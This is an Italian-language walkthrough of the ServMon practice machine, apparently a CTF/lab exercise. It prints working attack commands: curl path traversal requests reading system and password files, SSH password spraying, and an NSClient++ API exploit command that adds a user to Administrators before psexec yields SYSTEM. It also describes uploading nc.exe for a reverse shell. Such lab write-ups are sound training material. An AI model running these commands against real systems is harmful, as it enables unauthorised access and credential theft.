+++
date = '2026-08-05T20:08:26+02:00'
draft = false
title = 'ServMon Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`05/08/2026`**

![ServMon.png](/images/imgs_servmon/ServMon.png)

---
# Introduzione

**_ServMon_** è una macchina **Windows** ufficialmente classificata come **Easy**, ma realisticamente si comporta molto di più come una **Medium** nonché indiscutibilmente una delle più frustranti a causa di un servizio instabile durante la fase di Privilege Escalation.

L'accesso iniziale è lineare: inizia con un accesso **FTP anonimo** che porta a una **information disclosure**, rivelando la posizione di un file contenente password. Sfruttando una **Path Traversal non autenticato (CVE-2019-20085)** nell'applicazione web **NVMS-1000**, sono riuscito a leggere il file con le password e ad eseguire un **password spraying** per entrare nella macchina via **SSH**. 
La Privilege Escalation si basa sull'abuso di un agente di monitoraggio locale (**NSClient++**) per eseguire comandi come **`SYSTEM`**. Sebbene la teoria sia semplice, la **Web GUI** dell'applicazione è estremamente buggata. Per evitare di perdere la sanità mentale, ho dovuto abbandonare lo sfruttamento manuale tramite e utilizzare uno script exploit per interagire direttamente con le API dell'applicazione.

---
# Tecniche Utilizzate

- **FTP Anonimo & Information Disclosure**
- **NVMS-1000 Path Traversal (CVE-2019-20085)**
- **Password Spraying**
- **SSH Local Port Forwarding**
- **NSClient++ Privilege Escalation (Authenticated RCE)**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- servmon -Pn -T5
```

```text
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http        
135/tcp   open     msrpc   
139/tcp   open     netbios-ssn 
445/tcp   open     microsoft-ds 
... [snip] ...
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV servmon -Pn
```

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd                                          
| ftp-syst:                    
|_  SYST: Windows_NT               
| ftp-anon: Anonymous FTP login allowed (FTP code 230)               
|_02-28-22  07:35PM       <DIR>          Users                                
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)         
| ssh-hostkey:               
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)            
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)                  
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)               
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Host script results:
| smb2-time: 
|   date: 2026-08-05T13:00:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## Enumerazione FTP

Vedendo che il login **FTP anonimo** era consentito, sono partito da lì:

```bash
ftp anonymous@servmon 21
```

Navigando nella struttura delle directory, ho trovato una cartella **`Users`** contenente le directory per **Nadine** e **Nathan**.
Ho scaricato due file interessanti: **`Confidential.txt`** dalla cartella di **Nadine** e **`Notes to do.txt`** da quella di **Nathan**.

![ftp.png](/images/imgs_servmon/ftp.png)

- **`Confidential.txt`**:

![confi.png](/images/imgs_servmon/confi.png)

- **`Notes to do.txt`**:

![todo.png](/images/imgs_servmon/todo.png)

Si trattava di un enorme information leak. Ora sapevo che c'era un file **`Passwords.txt`** situato sul Desktop di **Nathan** (**`C:\Users\Nathan\Desktop\Passwords.txt`**).

---
# Accesso Iniziale | NVMS Path Traversal & Password Spraying

Guardando la porta **80**, la pagina web ospitava un'istanza di **NVMS-1000** (un **Network Video Management System**).

![web.png](/images/imgs_servmon/web.png)

Una rapida ricerca online ha rivelato una vulnerabilità. (**CVE-2019-20085**).

**Nota**: _La [CVE-2019-20085](https://www.exploit-db.com/exploits/47774) è una vulnerabilità di Unauthenticated Directory Traversal in NVMS-1000. Il server web non sanifica correttamente le sequenze ../ nella richiesta HTTP. Questo permette a un attaccante di sfuggire alla web root directory e leggere file arbitrari sul file system Windows sottostante utilizzando i privilegi del server web._

![cve.png](/images/imgs_servmon/cve.png)

Ho testato la vulnerabilità manualmente usando **curl** targettando il classico file **`win.ini`**.

```bash
curl -v --path-as-is "http://servmon/../../../../../../../../../../../../windows/win.ini"
```

![winini.png](/images/imgs_servmon/winini.png)

**Nota**: _Nota l'utilizzo di **`--path-as-is`** per evitare che **curl** risolva i **`../`** localmente prima di inviare la richiesta._

Conoscendo il percorso esatto grazie agli appunti presi via **FTP**, ho estratto il file delle password:

```bash
curl --path-as-is "http://servmon/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" 
```

![pass.png](/images/imgs_servmon/pass.png)

Ho salvato tutto in un file **`pass.txt`** e ho tentato un **password spraying** contro i due utenti noti (**nathan** e **nadine**) su **SSH** utilizzando **NetExec**:

```bash
nxc ssh servmon -u nathan -p pass.txt --continue-on-success
nxc ssh servmon -u nadine -p pass.txt --continue-on-success
```

![spray.png](/images/imgs_servmon/spray.png)

Ho ottenuto un riscontro positivo per **nadine**.

![userf.png](/images/imgs_servmon/userf.png)

Mi sono loggato tramite **SSH** e ho preso la **user flag**.

---
# Privilege Escalation | NSClient++ & The Web GUI Nightmare

Esplorando il file system, ho notato un programma non predefinito installato in **`C:\Program Files\NSClient++`**.

![program.png](/images/imgs_servmon/program.png)

**Note**: _**NSClient++** è un agente per sistemi **Windows**. Permette ai server di monitoraggio di eseguire script, controllare le metriche del sistema e raccogliere dati. Dispone di un'interfaccia web e di un'API. Se un attaccante riesce ad accedere all'interfaccia web o all'API, spesso può programmare ed eseguire script esterni custom. Poiché il servizio **NSClient++** di solito viene eseguito come **`NT AUTHORITY\SYSTEM`**, questo porta direttamente a una Local Privilege Escalation._

Ho analizzato il suo file di configurazione alla ricerca di credenziali, dato che di default vengono salvate in:

- **`C:\Program Files\NSClient++\nsclient.ini`**

![ini.png](/images/imgs_servmon/ini.png)

Ho trovato la password dell'**administrator** in chiaro: **`ew2x6SsGTxjRwXOT`**.

Poiché la **Web UI** di **NSClient++** è ospitata sulla porta **8443** e avevo già una sessione **SSH** attiva, ho impostato un tunnel:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@servmon
```

![nscweb.png](/images/imgs_servmon/nscweb.png)

## La Frustrazione della GUI

Ho cercato metodi di Local Privilege Escalation per questo software e ho trovato un processo ben documentato.

- **https://github.com/advisories/GHSA-jr25-22p3-gm6r**

L'exploit path standard prevede:

1. **Loggarsi nella Web GUI.**

2. **Abilitare i moduli `CheckExternalScripts` e `Scheduler`.**

3. **Caricare `nc.exe` e un file `.bat` malevolo.**

4. **Aggiungere un nuovo script per richiamare il file `.bat` e programmarne l'esecuzione ogni minuto.**

5. **Riavviare il servizio per ottenere una reverse shell come `SYSTEM`.**

Ho seguito meticolosamente questi passaggi. Ho trasferito **`nc.exe`** e il mio payload **`.bat`** in **`C:\Windows\Temp\`**, ho configurato la **GUI** e ho ricaricato il servizio

![privesc2.png](/images/imgs_servmon/privesc2.png)

![privesc4.png](/images/imgs_servmon/privesc4.png)

Ricevevo una connessione, ma nessuna shell.

![root.png](/images/imgs_servmon/root.png)

Ho provato a sostituire il payload con **PowerShell**, comandi **cmd** standard e varie altre reverse shell. Non solo nessuno di questi ha funzionato, ma l'interfaccia web ha iniziato a rompersi completamente. Continuavo a ricevere costanti errori di connessione, costringendomi a riavviare ripetutamente la macchina. È stato un loop incredibilmente frustrante.

## La Via dell'API  (Exploit-DB 48360)

Rendendomi conto che la **GUI** era un vicolo cieco su questa specifica istanza, ho cercato modi alternativi per interagire con il software.

Ho trovato un exploit su **Exploit-DB**: [EDB-ID: 48360](https://www.exploit-db.com/exploits/48360) che bypassa la GUI instabile e interagisce direttamente con le **REST API** di **NSClient++**.

Dal momento che avevo una **Authenticated RCE**, invece di cercare di ottenere una reverse shell, ho deciso di usare l'exploit per aggiungere semplicemente **nadine** al gruppo locale **Administrators**:

```bash
python3 exp.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'cmd.exe /c net localgroup Administrators /add nadine'
```

Ho controllato le mie appartenenze ai gruppi nella sessione **SSH**, ma l'accesso a **`C:\Users\Administrator`** era ancora negato.

Dato che **WinRM** non era abilitato, non potevo usare **Evil-WinRM**. Tuttavia, **SMB** lo era, quindi mi sono autenticato usando **`psexec.py`** di **Impacket** con le credenziali di **Nadine** (che ora agiva come **local Admin**):

```bash
psexec.py servmon/nadine:'<nadine_password>'@servmon
```

![rootf.png](/images/imgs_servmon/rootf.png)

Questo mi ha fornito istantaneamente una shell **`NT AUTHORITY\SYSTEM`**. Ho navigato fino al desktop dell'**Administrator** e ho preso la **root flag**.

---
# Considerazioni Finali

**_ServMon_** è una macchina che mette alla prova la pazienza tanto quanto le skill.

L'accesso iniziale dà davvero l'impressione di una macchina **Easy**: fare 2+2 con le informazioni trovate sul server **FTP** e usare un semplice comando curl per eseguire un **Path Traversal** è una progressione pulita e logica.

La Privilege Escalation, tuttavia, rende questo box indubbiamente **Medium**, principalmente a causa dell'instabilità dell'intended path. Passare ore a litigare con una **Web GUI** rotta che richiede continui riavvii della macchina è stato davvero frustrante. Tuttavia, questo impone una lezione molto preziosa: quando l'interfaccia grafica ti abbandona, cerca sempre un modo per interagire con le **API** o la **CLI** sottostanti.

**Fonti**:

- **NVMS-1000 Arbitrary File Read (CVE-2019-20085) | https://www.exploit-db.com/exploits/47774**

- **NSClient++ Privilege Escalation (GUI Method)https://github.com/advisories/GHSA-jr25-22p3-gm6r**

- **NSClient++ Privilege Escalation (API Exploit) | https://www.exploit-db.com/exploits/48360**